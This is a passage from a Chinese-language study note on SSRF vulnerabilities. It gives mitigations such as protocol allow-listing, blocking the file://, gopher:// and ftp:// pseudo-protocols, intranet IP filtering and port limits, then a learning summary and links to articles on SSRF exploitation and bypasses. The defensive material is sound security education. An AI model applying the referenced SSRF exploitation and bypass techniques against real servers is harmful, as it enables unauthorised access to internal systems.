2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于`file://, gopher://, ftp:// `等伪协议引起的问题

4.对请求地址设置白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）

5.限制请求的端口为http常用的端口，比如 80、443、8080、8090

6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。



# 总结

通过一周的学习已经基本了解SSRF的原理、检测、验证以及利用方法，笔记仍有很多部分还没有学完。

还未完成的任务

~~~
1.搭建的php漏洞环境只研究学习了curl_exec函数
2.关于java、python的漏洞代码还未研究
3.漏洞绕过和防御仅仅是了解还没有修改环境实践
4.BOOL型SSRF仅仅是了解没有实践
5.没有把伪协议完全学明白
6.理解xxe的原理以及如何利用和防御
~~~





# 感谢

[了解SSRF,这一篇就足够了](https://xz.aliyun.com/t/2115) 

[ssrf](https://www.jianshu.com/p/d1d1c40f6d4c) 

[SSRF漏洞分析与利用](http://www.91ri.org/17111.html) 

[SSRF在有无回显方面的利用及其思考与总结](https://xz.aliyun.com/t/6373#toc-2) 

[SSRF从浅到深多种挖倔思路](https://my.oschina.net/u/4579293/blog/4345485) 

[[红日安全]Web安全Day4 - SSRF实战攻防](https://xz.aliyun.com/t/6235) 

[SSRF漏洞的挖掘经验](https://www.secpulse.com/archives/4747.html) 

[SSRF漏洞(原理&绕过姿势)](https://www.t00ls.net/articles-41070.html) 

[SSRF漏洞验证及利用方法](https://blog.csdn.net/W_seventeen/article/details/104567262/) 

[SSRF漏洞](https://blog.csdn.net/qq_41821603/article/details/110645776) 

[SSRF绕过方法总结](https://www.secpulse.com/archives/65832.html) 

 